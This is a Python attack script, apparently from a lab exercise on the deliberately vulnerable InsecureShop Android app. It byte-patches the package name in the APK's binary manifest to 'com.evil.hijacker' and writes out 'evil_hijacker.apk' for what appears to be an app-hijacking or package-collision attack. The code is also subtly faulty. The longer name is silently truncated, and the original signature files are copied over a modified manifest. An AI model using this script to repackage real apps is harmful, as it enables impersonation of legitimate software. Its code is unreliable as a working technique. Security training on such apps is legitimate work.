import zipfile
import shutil
import os
import re

src = "apks/InsecureShop.apk"
dst = "apks/evil_hijacker.apk"

print("[*] Reading original APK binary manifest...")

with zipfile.ZipFile(src, 'r') as zin:
    manifest_data = bytearray(zin.read("AndroidManifest.xml"))


replacements = [
    # UTF-16 LE encoding
    ("com.insecureshop".encode('utf-16-le'),
     "com.evil.hijacker".encode('utf-16-le')),
    # UTF-8 encoding  
    (b"com.insecureshop",
     b"com.evil.hijacker"),
]

patched = False
for old, new in replacements:
    if old in manifest_data:
       
        if len(new) < len(old):
            new = new + b'\x00' * (len(old) - len(new))
        elif len(new) > len(old):
            new = new[:len(old)]
        
        count = manifest_data.count(old)
        manifest_data = manifest_data.replace(old, new)
        print(f"[+] Replaced {count} occurrence(s): {old[:20]}... → {new[:20]}...")
        patched = True

if not patched:
    print("[-] Pattern not found — dumping first 200 bytes for inspection:")
    print(manifest_data[:200])
else:
   
    with zipfile.ZipFile(src, 'r') as zin:
        with zipfile.ZipFile(dst, 'w', zipfile.ZIP_DEFLATED) as zout:
            for item in zin.infolist():
                if item.filename == "AndroidManifest.xml":
                    zout.writestr(item, bytes(manifest_data))
                    print(f"[+] Written patched manifest to {dst}")
                else:
                    zout.writestr(item, zin.read(item.filename))

    size = os.path.getsize(dst)
    print(f"[+] evil_hijacker.apk size: {size} bytes")
    
    if size < 100000:
        print("[-] WARNING: File seems too small, something may have gone wrong")
    else:
        print("[+] Size looks good! Run collision_detector.py now")
